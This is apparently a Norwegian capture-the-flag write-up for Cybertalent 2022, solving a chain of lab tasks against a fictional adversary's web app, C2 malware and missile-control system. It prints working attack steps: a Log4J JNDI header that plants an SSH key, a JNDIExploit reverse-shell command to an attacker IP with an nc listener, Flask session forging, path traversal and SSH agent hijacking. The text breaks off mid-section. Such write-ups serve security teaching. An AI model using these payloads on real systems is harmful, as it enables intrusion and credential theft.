# Cybertalent-2022

Cybertalent er 


---

## 2_01 - pcap_fil

Når vi åpner PCAP-filen i Wireshark er det en HTTP pakke som skiller seg ut:

```text
GET / HTTP/1.1
Host: pwr-07-ws-caf5db
Accept: */*
X-Flag: caf5db3e4479b9c3dcb91e43ef9aa497
User-Agent: ${jndi:ldap://10.0.30.98:1389/Basic/Command/Base64/ZWNobyBzc2gtZWQyNTUxOSBBQUFBQzNOemFDMWxaREkxTlRFNUFBQUFJTVRnYnlrZW1wZEFaNEZhaHpMUit0c2NrdFNsaUt0RWR3Wk9sWllXQkhxQyA%2bPiAuc3NoL2F1dGhvcml6ZWRfa2V5cw==}
```

Den inneholder både et flagg og en indikator på en utnyttelse av en Log4J-svakhet. Vi kommer tilbake til sistnevnte på 2.06.

```text
Kategori: 2. Oppdrag
Oppgave:  2.01_pcap
Svar:     caf5db3e4479b9c3dcb91e43ef9aa497
Poeng:    10

Gratulerer, korrekt svar!
```

---

## 2.02_anvilnotes

INTREP gir oss en pekepinne mot en nettside som kan nås på ANVILNOTES.CYBERTALENT.NO.
Dette er tilsynelatende en helt vanlig nettside hvor man kan lage bruker, logge inn og lagre notater i skyen.

Om vi lager en testbruker og lager et notat, så kan vi se at hvert notat får en mangesifret unik ID. Vi kan logge ut og fortsatt kunne lese notatet så lenge vi har ID'en. Utifra dette begynte jeg å se etter "Insecure direct object references" (IDOR), og kom frem til at https://anvilnotes.cybertalent.no/note/1 gir oss tilgang til et notat skrevet av admin. Dette notatet innholder et flagg, og hint om veien videre.

```text
Kategori: 2. Oppdrag
Oppgave:  2.02_anvilnotes
Svar:     4aee8b5ccff539d35e7c8d6a1d749e1b
Poeng:    10

Admin sine notater, som han laget før id ble randomisert...
Gir dette noen hint til hvordan du kan få mer tilgang?
```

---

## 2.03_anvilnotes_admin

I notatene til admin står følgende:
`☐ Secure flask token using military grade encryptions that can't be unsigned using open software.`

Basert på det, så googlet jeg følgende: `flask token exploit github`.
Da fikk jeg opp denne som fjerdevalg: https://github.com/Paradoxis/Flask-Unsign

Bruken av verktøyet er ganske rett frem, og hvordan/hvorfor det funker står best forklart på GitHub'en.

```
pip3 install flask-unsign[wordlist]
flask-unsign --unsign --cookie "eyJ1c2VybmFtZSI6ImEifQ.Y7HYAw.1tPvb-GFYM6W4EWgbaJELRAZy7k"
[*] Session decodes to: {'username': 'a'}
[*] No wordlist selected, falling back to default wordlist..
[*] Starting brute-forcer with 8 threads..
[*] Attempted (2176): -----BEGIN PRIVATE KEY-----.m2
[*] Attempted (2560): /-W%/egister your app with Twi
[*] Attempted (4224): 5#y2LF4Q8z8a52f30af11409c74288
[*] Attempted (31104): -----BEGIN PRIVATE KEY-----S_K
[+] Found secret key after 35712 attemptsYRjlMjM1k45F
'This is an UNSECURE Secret. CHANGE THIS for production environments.'
```

Nå som vi har hemmeligheten som ble brukt for å signere JWT så kan vi signere vår egen hvor vi er admin:

```
flask-unsign --cookie '{"username": "admin"}' --secret "This is an UNSECURE Secret. CHANGE THIS for production environments." --sign
eyJ1c2VybmFtZSI6ImFkbWluIn0.Y7HcuQ.fIhMwTA2wkD3L0lphwKfic0mKqA
```
Vi kan da bytte ut vår JWT med overnevnte og navigere til https://anvilnotes.cybertalent.no/notes for å motta neste flagg.

```text
Kategori: 2. Oppdrag
Oppgave:  2.03_anvilnotes_admin
Svar:     071f24b786f392f3657fe7bbf5491e80
Poeng:    10

Som admin har du kanskje tilgang til mer funksjonalitet?
```

---

## 2.04_anvilnotes_password

Som admin har vi nå tilgang til "Save as PDF"-funksjonaliteten.

Jeg brukte Burp Suite for å inspisere nettverkstrafikken, og lærte at /genpdf endepunktet mottok en notat-ID via `id`-parameteret, og returnerte en PDF ved å bruke HTML-til-PDF programvaren `Werkzeug/2.2.2`.
Werkzeug er kjent for å være sårbar for Server Side Template Injection tidligere, men jeg klarte ikke å utnytte dette. Jeg kikket etter Local File Inclusion via `id`-parameteret, og fant ut at `id=../../` avslører et internt API:

```xml
{
    "definitions": {},
    "info": {
        "title": "Cool product name",
        "version": "0.0.0"
    },
    "paths": {
        "/api/decrypt": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            },
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "GET(urlargs) or POST(body)",
                        "name": "data",
                        "required": true,
                        "type": "hex string"
                    }
                ],
                "produces": [
                    "plaintext string"
                ],
                "responses": {},
                "summary": "Decrypt our data with secret internal key"
            }
        },
        "/api/encrypt": {
            "post": {
                "description": "",
                "parameters": [
                    {
                        "in": "body",
                        "name": "data",
                        "required": true,
                        "type": "string"
                    }
                ],
                "produces": [
                    "hex string"
                ],
                "responses": {},
                "summary": "Encrypts data with secret internal key"
            }
        },
        "/api/user/{user}": {
            "get": {
                "description": "",
                "parameters": [
                    {
                        "in": "path",
                        "name": "<username>",
                        "required": true,
                        "type": "path"
                    }
                ],
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "Get information from the database on a user. example: /api/user/bob"
            }
        },
        "/api/users": {
            "get": {
                "description": "",
                "produces": [
                    "application/json"
                ],
                "responses": {},
                "summary": "List all users from database."
            }
        }
    },
    "swagger": "2.0"
}
```

Jeg brukte da Repeater-funksjonaliteten i Burp for å utforske API'et:
```
>>> id=../users
["a","admin","Benjamin","Brian","Cynthia","Frank","George","Henry","Jason","Julia","Karen","Laura","Marilyn","Mark","Mary","Olivia","oper","Richard","Russell","Samuel","Sharon","Stephen","Theresa"]

>>> id=../user/oper
{"password":"83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048","username":"oper"}
```

Passordet ser ikke ut til å passe noe slags hash-format som jeg er bekjent, og hvis man sammenligner den med de andre brukerne så er lengden varierende.
Det vil da hinte til at det er kryptert, ikke hashet.

API'et har dekrypteringsfunksjonalitet, så vi kan benytte det i henhold til beskrivelsen som ble gitt:

```
>>> id=../decrypt?data=83105903c96feecb4e2fce49379af0b5f4e140533d2f216d2cc617d210eec4fbebbdcd4a3c6202b1f285420146edc8ed72ce3166e8806cdf2cf3d290630741f598b2d34bac5048
FLAGG: ed9e224f5a359543420928d1ed1a8ca8
```

Ser ut som om passordet til `oper` er `FLAGG: ed9e224f5a359543420928d1ed1a8ca8`. Det er beleilig.

```text
Kategori: 2. Oppdrag
Oppgave:  2.04_anvilnotes_password
Svar:     ed9e224f5a359543420928d1ed1a8ca8
Poeng:    10

Hvis aktøren har benyttet denne tjenesten finner vi kanskje noen interessante notater.
```

---

## 2.05_anvilnotes_source

Hvis vi logger på med brukernavn og passord nevnt ovenfor så finner vi to notater:

```
Backup of client source code	
Backup of server source code
```

Flagget ligger i notatene, sammen med den Base-64-kodet kildekoden til C2-klienten/-serveren.
Disse kommer vi tilbake til for 2.09.

```text
Kategori: 2. Oppdrag
Oppgave:  2.05_anvilnotes_source
Svar:     eacad6dfaadb1b0420dc17b6560b89de
Poeng:    10

Dette så interessant ut!
En samarbeidende tjeneste i Pseudova vurderer at dette meget sannsynlig er kildekoden for skadevaren benyttet i angrepene mot kraftverket deres.
```

---

## 2.06_pwr-ws-caf5db

En rask nmap skann av subnettet avslører at serveren med Log4J-sårbarheten fortsatt er tilgjengelig:

```bash
>>> nmap -sn 10.0.236.101/27
Nmap scan report for 0e7e17e3605aa2385b923dbd549531e4_pwr-ws-caf5db.1.4gpt2qoq7daix109e09sese50.0e7e17e3605aa2385b923dbd549531e4_backend (10.0.236.102)
Host is up (0.0076s latency).
```

Da jeg tidligere har utnyttet Log4J så har jeg hatt best erfaring med [dette](https://github.com/zzwlpx/JNDIExploit) Github repositoret. `JNDIExploit.jar`-fila er ikke tilgjengelig der lengre, men kan finnes [her](https://github.com/black9/Log4shell_JNDIExploit).

I angrepet vi observerte i pcap-fila var sårbarheten i User-Agent headeren. Utnyttelsen blir derfor slik:

```bash
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 10.0.69.36 &
nc -lvnp 4444
curl pwr-ws-caf5db -A '${jndi:ldap://corax:1389/Basic/ReverseShell/10.0.69.36/4444}'
```

Om alt gikk bra vil vi få et shell i terminalen vi kjørte `nc`, og flagget ligger godt synlig.

```text
Kategori: 2. Oppdrag
Oppgave:  2.06_pwr-ws-caf5db
Svar:     74320a680cc9edc8d1f7a9a4a5c613dc
Poeng:    10

Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.

Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.

Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
```

---

## 2.07_shady-aggregator

Om vi bruker `ps -aux` for å liste prosessene som kjører ser vi en aktiv SSH forbindelse:
`user         428  0.0  0.0   9100  1616 ?        Ss    2022   0:00 ssh: /home/user/.ssh/cp/archive@shady-aggregator_`

```
>>> ls -la /tmp/ssh-njl06sp7u2/agent.203 
srwxr-xr-x 1 user user 0 Dec 31 22:33 /tmp/ssh-njl06sp7u2/agent.203=
```

```
SSH_AUTH_SOCK=/tmp/ssh-njl06sp7u2/agent.203 ssh archive@shady-aggregator.utl
```


```text
Kategori: 2. Oppdrag
Oppgave:  2.07_shady-aggregator
Svar:     8f1e081e605843164b5efc848c12696a
Poeng:    10

Utmerket! Denne maskinen administrerer et botnett.

Det burde være mulig å hoppe videre til de andre enhetene som kontrolleres.
```

---

## 2.08_client_list

`ps -aux` på `pwr-ws-caf5db` forteller oss at det er en aktiv c2 klient på maskinen. I mappen `/tmp/.tmp/` finner vi følgende filer:

```text
-rw-r--r-- 1 user user 11258 Dec 18 22:02 .client
-rw-r--r-- 1 user user   202 Jan  1 22:43 .config
-rw-r--r-- 1 user user    22 Jan  1 22:43 .output
```

Om vi kjører `strings /tmp/.tmp/.config` får vi en suspekt URL:
`http://shady-aggregator.utl/f52e6101/`


En rask rekognosering med kommandoen `gobuster dir -h http://shady-aggregator.utl/f52e6101/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt` sier oss at `/list` er en gyldig sti:

```
curl http://shady-aggregator.utl/f52e6101/list

ID               | NAME                             | LAST CHECKIN
-----------------+----------------------------------+--------------------
42FD29AED93B779C | pwr-ws-caf5db                    | 2023-01-01 23:45:02
DEADBEEFDEADBEEF | test-3                           | 2023-01-01 23:45:01
18F53CE5F533ACF7 | aurum                            | 2023-01-01 23:44:37
FLAGG            | 260c54fac22eb752739f2978fff9e021 | 2022-11-30 17:48:21
6ED230A80172B12E | pwr-ws-72fed1                    | 2022-11-16 11:00:32
F7D79C0F8995E423 | pwr-ws-64ca70                    | 2022-11-07 09:07:29
58A5FCF9FB1712B7 | pwr-ws-6d5602                    | 2022-06-30 01:47:58
93B58D54A5DB772A | pwr-ws-b5747c                    | 2022-06-11 17:25:14
CAFEBABECAFEBABE | test-2                           | 2022-02-23 08:06:40
46E894E2BEC4BD46 | pwr-ws-a8a1ce                    | 2022-02-06 22:53:02
14B6A84F08AC6887 | pwr-ws-e3fb32                    | 2022-01-27 17:24:04
DEADC0DEDEADC0DE | test-1                           | 2021-12-20 12:33:20
```

```text
Kategori: 2. Oppdrag
Oppgave:  2.08_client_list
Svar:     260c54fac22eb752739f2978fff9e021
Poeng:    10

En liste over alle de infiserte klientene deres?

Den test-instansen som fortsatt sjekker inn så spennende ut...
```

---

## 2.09_cloud-hq

Nå har vi tilgang til både archive@shady-aggregator og kildekoden for skadevaren som er i bruk. Scoreboard-teksten til 2.08 hinter mot den test-3 instansen som sjekker inn hvert 10. sekund.

Det mest logiske er at det er en sårbarhet i skadevaren som vil gi oss tilgang til de som opererer skadevaren.
Dette fant jeg ikke med det første, så gravde meg ned i et kaninhull som endte med at jeg fikk tilgang til c2-brukeren på shady-aggregator, som var et flagg i umulig-kategorien. Det var gjennom en race condition -> SSTI, og gjennomgangen ligger [nederst](#3413_shady-aggregator_c2).

Men selv tilgang til brukeren som kjørte serveren var ikke det som måtte til for å få tilgang til skurkene. Hver en kommando som blir lastet opp og ned går gjennom en ECDSA signatursjekk, og implementasjonen virket nokså plettfri både på serveren og klienten i mine øyne.

Etter mye leting på nettet kom jeg over en sårbarhetskategori som heter Java Deserialization. Etter mange timers lesing gjennom slides og whitepapers på [denne](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#overview) GitHub'en så forstod jeg litt hvordan sårbarheten fungerte, og hvordan den kunne anvendes i denne situasjonen.

I Config.java er det en `readObject()` funksjon som håndterer hvordan et Config-objekt skal leses inn.
I denne ser vi at den går gjennom alle `pendingCommands`, og kjører de hvis tiden er inne. Dette skjer da altså før noe som helst verifikasjon gjennom ECDSA.

```java
private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException {
    id = ois.readUTF();
    sleepDuration = ois.readInt();
    serverURL = ois.readUTF();
    pendingCommands = new ArrayList<Command>();
    Instant now = Instant.now();
    int pendingCommandsSize = ois.readInt();
    for (int i = 0; i < pendingCommandsSize; i++) {
        Command c = (Command) ois.readObject();
        if (c.runAfter.isBefore(now))
            c.execute(System.out, this);
        else
            pendingCommands.add(c);
    }
}
```

Klienten mottar kommandoer gjennom `checkInWithC2()` funksjonen til `Client.java`, mer spesifikt disse to linjene:

```java
ObjectInputStream in = new ObjectInputStream(conn.getInputStream());
Command c = (Command) in.readObject();
```

Selv om det mottatte objektet blir kastet til et `Command` object, så vil `readObject()` bli eksekvert før dette.
Det spiller da ingen rolle om denne kastingen feiler, vi bryr oss bare om hva som skjer i `readObject()`.




```text
Kategori: 2. Oppdrag
Oppgave:  2.09_cloud-hq
Svar:     80e125e2403402c9486c94eb3b276482
Poeng:    10

Det er noe veldig tilfredstillende med å utnytte sårbarheter i skadevare.

Dette ser ut som operatøren bak angrepet mot kraftverket. Jeg legger ssh-nøkkelen hans i oppdragsmappen din mens du går gjennom koden som ligger her.

Ny fil: /home/login/2_oppdrag/sshkey_cloud-hq
```

---

## 2.10_infrastruktur

På `cloud-hq-79` finner vi kildekoden til skadevaren. Blant denne ligger det en fil kalt `GenCommand.java`. Denne inneholder koden og privatnøkkelen man trenger for å lage kommandoer, og et flagg.

```text
Kategori: 2. Oppdrag
Oppgave:  2.10_infrastruktur
Svar:     c4381f44298bb0dede6c185dc2406a40
Poeng:    10

Vi har nå god kontroll på Utlandias infrastruktur for cyberoperasjoner.

Vi mangler fortsatt informasjon om det gamle regimets planer. Informasjonen du har samlet inn vil bli overlevert til våre analytikere som vil sammenstille en rapport. Rapporten vil legges i oppdragsmappen din på corax så snart det lar seg gjøre.

Forbered for fremtidige operasjoner og avvent ytterligere ordre.

Ny fil: /home/login/2_oppdrag/INTREP-2.txt
```

---

## 2.11_aurum_shell

Vi bruker samme utnyttelse som for 2.09, men bytter ut ID'en til aurum sin.
Flagget ligger godt synlig i `/home/user/FLAG`.

```text
Kategori: 2. Oppdrag
Oppgave:  2.11_aurum_shell
Svar:     4ad7dab1e6231e8903985e5ea70cf4dc
Poeng:    3

Hva brukes denne maskinen til?

Ny fil: /home/login/2_oppdrag/sshkey_aurum
```

---

## 2.12_missile_targets

En naturlig ting å gjøre i et nytt miljø er å sjekke hva som er blitt gjort før. Dette forteller `history` kommandoen oss:

```bash
1  ls -lah
2  which signer
3  signer --help
4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
5  rm test.txt
6  konekt
7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
9  konekt
10 rm privkey.pem missile.1.3.37.fw
```

`signer` og `konekt` er ikke-standard kommandoer, og fortjener litt videre utforskning.

Når vi kjører `konekt` blir vi møtt av følgende meny.

```
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                                         MAIN │
╞══════════════════════════════════════════════════════════════════════════════╡
│ p: program                                                                   │
│ m: missile                                                                   │
│ f: firmware                                                                  │
│ u: user                                                                      │
└──────────────────────────────────────────────────────────────────────────────┘
```

Om vi velger `missile` -> `list submarines with missiles` får vi følgende liste:

```
╒══════════════════════════════════════════════════════════════════════════════╕
│                                                list submarines with missiles │
╞══════════════════════════════════════════════════════════════════════════════╡
│ sub | missile | __tof__ | ____________.____target___.____________ | checksum │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   1 |       1 | 1080.00 |  3965173.80 |    -8172.61 |  4986679.35 | ill-buzz │
│   1 |       2 | 1080.00 |  3877218.23 |  -128524.04 |  5053741.33 | tan-city │
│   1 |       3 | 1080.00 |  3788140.78 |  -148481.80 |  5120310.89 | any-fang │
│   1 |       4 | 1080.00 |  3793400.39 |  -197697.20 |  5114750.27 | six-crop │
│   1 |       5 | 1080.00 |  3761259.92 |  -101682.56 |  5141228.01 | few-darn │
│   1 |       6 | 1200.00 |  3565283.98 |  -265059.37 |  5273341.89 | its-folk │
│   1 |       7 | 1200.00 |  3561474.41 |  -199048.12 |  5278818.14 | wry-cook │
│   1 |       8 | 1000.00 |  3798982.34 |   -97495.01 |  5113498.70 | few-area │
│   1 |       9 | 1080.00 |  3780277.58 |  -415086.43 |  5111442.62 | bad-dime │
│   1 |      10 | 1100.00 |  3904518.71 |   292813.87 |  5025796.92 | day-acid │
│   1 |      11 |  500.00 |  4517609.64 |   -45797.26 |  4492076.00 | bad-dory │
│   1 |      12 | 1300.00 |  3931251.08 |   515136.93 |  4986936.93 | her-chin │
│   1 |      13 |  900.00 |  4840420.30 |  -313337.46 |  4130592.21 | the-clue │
│   1 |      14 | 1080.00 |  3978633.52 |   306311.28 |  4966516.86 | sly-chug │
│   1 |      15 | 1500.00 |  3771037.60 |   898732.45 |  5055808.19 | one-epee │
│   1 |      16 | 1200.00 |  4629467.70 |  1026020.23 |  4254991.45 | top-game │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   2 |       1 | 2000.00 |  2871529.36 |  1335712.45 |  5528094.82 | fat-blow │
│   2 |       2 | 1400.00 |  3916904.74 |   305684.71 |  5015381.85 | coy-drug │
│   2 |       3 | 1100.00 |  3506335.17 |   781724.52 |  5261574.05 | new-bore │
│   2 |       4 | 1300.00 |  4187571.65 |   171778.44 |  4798372.31 | top-draw │
│   2 |       5 | 2000.00 |  4073672.03 |  1196123.56 |  4750171.12 | hot-blow │
│   2 |       6 | 1800.00 |  3642005.91 |  1399313.87 |  5036601.50 | sea-axis │
│   2 |       7 | 1100.00 |  3727617.22 |   656855.67 |  5124748.92 | ten-bank │
│   2 |       8 | 2100.00 |  4068863.73 |  1404219.05 |  4697037.13 | new-epic │
│   2 |       9 | 2000.00 |  4776300.55 |   179647.34 |  4212400.85 | icy-beat │
│   2 |      10 | 1800.00 |  4165201.60 |   853184.42 |  4744766.90 | odd-cyst │
│   2 |      11 | 1500.00 |  3089215.84 |  1007518.11 |  5480081.55 | own-axis │
│   2 |      12 | 1600.00 |  4038925.22 |   616753.05 |  4888388.26 | fat-dirt │
│   2 |      13 | 1300.00 |  3137883.12 |   596195.86 |  5512520.39 | six-fill │
│   2 |      14 | 2000.00 |  3960132.01 |  1018155.11 |  4885729.80 | two-comb │
│   2 |      15 | 1600.00 |  4144099.14 |   669960.54 |  4792414.44 | own-chop │
│   2 |      16 | 2000.00 |  3824498.89 |  1172080.09 |  4958737.49 | raw-coke │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   3 |       1 | 1500.00 |  4410958.41 |   713514.00 |  4541363.75 | odd-fine │
│   3 |       2 | 1300.00 |  4299765.90 |  1853546.05 |  4320419.11 | the-fact │
│   3 |       3 | 1900.00 |  3985471.63 |   486043.26 |  4946657.34 | fat-dawn │
│   3 |       4 |  600.00 |  4669514.06 |  1190727.92 |  4167426.84 | sly-foal │
│   3 |       5 | 1900.00 |  3874979.79 |   332003.34 |  5046181.37 | bad-clef │
│   3 |       6 | 1600.00 |  4616563.98 |   433955.07 |  4369057.23 | wee-beet │
│   3 |       7 | 1000.00 |  4446250.49 |   604524.44 |  4522725.70 | one-dirt │
│   3 |       8 | 1700.00 |  3845603.32 |  1395471.42 |  4884018.39 | icy-bias │
│   3 |       9 | 1700.00 |  4918271.64 |   -32190.47 |  4049593.66 | sea-cafe │
│   3 |      10 | 1000.00 |  4269110.60 |  1221452.38 |  4568631.07 | tan-burn │
│   3 |      11 | 2000.00 |  5034046.16 |  -528572.99 |  3868931.49 | cut-cyst │
│   3 |      12 | 1800.00 |  4759979.88 |   -73754.64 |  4234004.35 | few-case │
│   3 |      13 | 1700.00 |  3718215.79 |  1313565.45 |  5003904.29 | wee-boss │
│   3 |      14 | 1080.00 |  4085093.56 |  2000940.11 |  4460705.13 | two-fork │
│   3 |      15 | 1900.00 |  3961278.75 |   471185.24 |  4967483.89 | all-area │
│   3 |      16 |  600.00 |  4876635.39 |  1158780.74 |  3932593.98 | shy-chip │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   4 |       1 | 2200.00 |  4597051.62 |  2020600.46 |  3920960.49 | hot-beat │
│   4 |       2 | 2000.00 |  3171884.46 |  1419189.87 |  5339914.80 | all-colt │
│   4 |       3 | 1600.00 |  3887682.95 |   851924.98 |  4974915.69 | fun-babe │
│   4 |       4 | 1700.00 |  3329463.78 |   706154.41 |  5385690.11 | new-bear │
│   4 |       5 | 1300.00 |  4611888.79 |   116255.99 |  4393928.46 | the-copy │
│   4 |       6 | 1100.00 |  3865581.56 |   -76231.47 |  5063705.07 | old-bass │
│   4 |       7 | 1400.00 |  4570639.43 |   584655.32 |  4399667.53 | low-diet │
│   4 |       8 | 1100.00 |  3670172.41 |  -380922.31 |  5193685.94 | few-babe │
│   4 |       9 | 1500.00 |  3940686.48 |   484402.33 |  4982568.16 | due-edge │
│   4 |      10 | 1600.00 |  5091632.09 |  -393567.62 |  3809203.09 | icy-alto │
│   4 |      11 | 2000.00 |  3330020.22 |  1572646.72 |  5198787.23 | wee-gene │
│   4 |      12 | 1550.00 |  3782049.34 |   585606.67 |  5093408.35 | two-fate │
│   4 |      13 | 1600.00 |  4496095.57 |   707789.04 |  4458004.07 | hot-coin │
│   4 |      14 | 1600.00 |  3890478.06 |   951077.25 |  4954722.35 | red-chef │
│   4 |      15 | 1500.00 |  4907473.21 |  -789505.95 |  3985351.69 | key-debt │
│   4 |      16 | 1750.00 |  3718324.97 |  1131497.77 |  5048109.87 | key-geek │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│   5 |       1 | 2000.00 |  3833839.73 |   657618.26 |  5045676.58 | big-bone │
│   5 |       2 | 1300.00 |  4428743.04 |   374560.24 |  4564600.82 | bad-chug │
│   5 |       3 | 1700.00 |  4063995.57 |   794515.12 |  4841727.66 | few-beam │
│   5 |       4 | 1600.00 |  3944256.52 |   467894.59 |  4981320.73 | due-coat │
│   5 |       5 | 2000.00 |  3516587.05 |  1186080.23 |  5178462.15 | her-cash │
│   5 |       6 | 2000.00 |  4062712.85 |  1250376.84 |  4745583.53 | icy-fate │
│   5 |       7 | 1100.00 |  5019970.12 |   -99074.77 |  3921699.27 | sad-bend │
│   5 |       8 | 2200.00 |  2941903.82 |  1356458.76 |  5485878.47 | two-fill │
│   5 |       9 | 1100.00 |  4905851.41 |   227075.15 |  4058411.00 | coy-boat │
│   5 |      10 | 1800.00 |  3674173.23 |   953834.06 |  5116668.12 | dry-epic │
│   5 |      11 | 1400.00 |  4455748.78 |   894105.71 |  4465032.90 | its-bulb │
│   5 |      12 |  600.00 |  4898728.76 |  -809920.21 |  3992007.87 | mad-bulb │
│   5 |      13 | 1800.00 |  3989809.15 |  1190414.03 |  4822237.90 | shy-cock │
│   5 |      14 | 1200.00 |  5437633.32 | -1356240.55 |  3030246.93 | the-boot │
│   5 |      15 | 1500.00 |  4511619.77 |   898015.45 |  4407776.80 | cut-fuel │
│   5 |      16 | 1600.00 |  4367306.66 |   953423.03 |  4539521.79 | one-boom │
│ ----+---------+---------+-------------+-------------+-------------+--------- │
│ FLAG| bc23d07612ac5bb9aa1b0a4e612ff275                                       │
└──────────────────────────────────────────────────────────────────────────────┘
```

```text
Oppgave:  2.12_missile_targets
Svar:     bc23d07612ac5bb9aa1b0a4e612ff275
Poeng:    3

Bra jobba! Dette må være kontrollsystemet til missilene. Målparametrene er allerde lagt inn og sikter på mange vestlige byer!
Dette er viktig informasjon som vi har levert videre til våre oppdragsgivere. Analytikerene våre har plottet målene for deg, sjekk oppdragsmappen.
Som du forstår er det ekstremt viktig å forhindre dette!

Ny fil: /home/login/2_oppdrag/worst_case_scenario.jpg
```
![Worst case scenario](images/worst_case_scenario.jpg)

---

## 2.13_findflag

Jeg reverse engineeret `/usr/bin/konekt`, og fant ut at den fungerte som en wrapper for en tjeneste som kjørte på serveren `mad`, port 1337.


I funksjonen `ui_read_key()` finner vi følgende:

```C
input = read(*(_session + 1), &read_buf, 1);
if (input == 1) {
    _history.0 = read_buf | _history.0 << 8;
    if (_history.0 == 0x726f6f646b636162) {
        **_session = **_session ^ 2;
}
```

Den leser en enkelt byte med data fra `read()`, og lagrer den i en buffer kalt `read_buf`. 
Deretter utfører den en bitvis venstre skyving på `_history.0` før den ORer den med `read_buf`. Resultatet blir lagret tilbake i `_history.0`.
Lettere sagt: de siste 8 bokstavene vi har skrevet inn er lagret i `_history.0`.

`0x726f6f646b636162` er hex for `roodkcab`, som er backdoor baklengs.
Når `_history` inneholder den verdien, så blir privilegiet vår forhøyet til `Developer`.

Nå som vi er `Developer` har vi tilgang til å rename brukeren vår. Grunnet feil i programvare (som vil ta litt for mye tid å forklare), så får vi `SYSTEM` privilegier om vi kaller oss `!`.

Vi er nå priviligert nok til å kjøre programmer, og når vi kjører `findflag.prg` får vi opp dette flotte bildet:

![2.13_flag](images/2.13_flag.png)

```
Kategori: 2. Oppdrag
Oppgave:  2.13_findflag
Svar:     bc05429e668f76f0cb22b53ca900e447
Poeng:    4

Herlig! Vi har nå lov til å kjøre programmer. Kan du bruke dette til noe?
```

---

## 2.14_multiplier

`history` viste oss dette:

```bash
1  ls -lah
2  which signer
3  signer --help
4  echo "Testing testing" > test.txt && signer --file-name test.txt --key-file privkey.pem --rng-source urandom
5  rm test.txt
6  konekt
7  signer --file-name missile.1.3.37.fw --key-file privkey.pem --rng-source urandom
8  mv missile.1.3.37.fw_signed missile.1.3.37.fw
9  konekt
10 rm privkey.pem missile.1.3.37.fw
```

`signer` blir brukt for å signere to filer, `test.txt` og `missile.1.3.37.fw`. Dette gjøres med en private key, `privkey.pem`, som blir slettet etter bruk.

Hjelp-menyen nevner ECDSA, og hinter til at secp256k1-kurven blir benyttet:

```bash
user@aurum:~$ signer --help
Sign a file with ECDSA

Usage: signer [OPTIONS] --file-name <FILE_NAME> --key-file <KEY_FILE>

Options:
  -f, --file-name <FILE_NAME>    Path to the file to sign
  -k, --key-file <KEY_FILE>      PEM-file containing the secp256k1 private key
  -r, --rng-source <RNG_SOURCE>  RNG seed source (one of Clock, Urandom) [default: Urandom]
  -h, --help                     Print help information
```

Jeg lagde min egen privatnøkkel, signerte to filer med forskjellig innhold, og sammenlignet signaturene:

```bash
user@aurum:~$ openssl ecparam -genkey -name secp256k1 -out privkey.pem -param_enc explicit

user@aurum:~$ echo -n aaaaaaaaaaaaaaaa > a.txt && signer --file-name a.txt --key-file privkey.pem --rng-source urandom
File size: 16 bytes
Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 101470930953263482905196496644008688681262853128827165933802638504190043123950 }

user@aurum:~$ echo -n bbbbbbbbbbbbbbbb > b.txt && signer --file-name b.txt --key-file privkey.pem --rng-source urandom
File size: 16 bytes
Signature: Signature { r: 17211542253021086784505659283610982505828311641993563606189014132281847868803, s: 89169711667094524674132738496910071433093664457918580439307144153630819379727 }

user@aurum:~$ cat a.txt_signed | hd
00000000  61 61 61 61 61 61 61 61  61 61 61 61 61 61 61 61  |aaaaaaaaaaaaaaaa|
00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
00000030  e0 56 82 fc 14 07 3f c8  7e db 80 9d 79 af 25 c0  |.V....?.~...y.%.|
00000040  84 7d 1b 1e 3b 49 6b bd  cf 18 69 60 8c 86 70 ee  |.}..;Ik...i`..p.|

user@aurum:~$ cat b.txt_signed | hd
00000000  62 62 62 62 62 62 62 62  62 62 62 62 62 62 62 62  |bbbbbbbbbbbbbbbb|
00000010  26 0d 63 3f e0 91 a7 ef  24 42 7c d1 96 c6 cd 15  |&.c?....$B|.....|
00000020  f8 19 49 d5 6a 39 3e 23  36 e0 d0 0d 15 fc 6d 83  |..I.j9>#6.....m.|
00000030  c5 24 44 ad b4 c3 94 4c  4e 7e 72 35 cf ee 6c 08  |.$D....LN~r5..l.|
00000040  95 b3 f6 b3 fe 63 76 00  2a ec 4b ee 1b 5e 6a 0f  |.....cv.*.K..^j.|
```

`r` har samme verdi over flere signeringer. Dette er veldig dårlig kryptografimessig, men veldig bra for oss. `r = k * G`, hvor `k` er tiltenkt å være en tilfeldig verdi hver gang. Siden den er statisk er det mulig for oss å regne ut privatnøkkelen.

Jeg prøvde å reverse engineere `signer` for å finne ut hvorfor dette skjedde, men det ga meg ingenting (bortsett fra redusert livsgnist av å måtte reversere kompilert Rust-kode).

Lastet ned `missile.1.3.37.fw` og sammenlignet signaturen med `test.txt_signed` for å sjekke om det samme fenomenet hadde skjedd ved den tidligere signeringen:

```bash
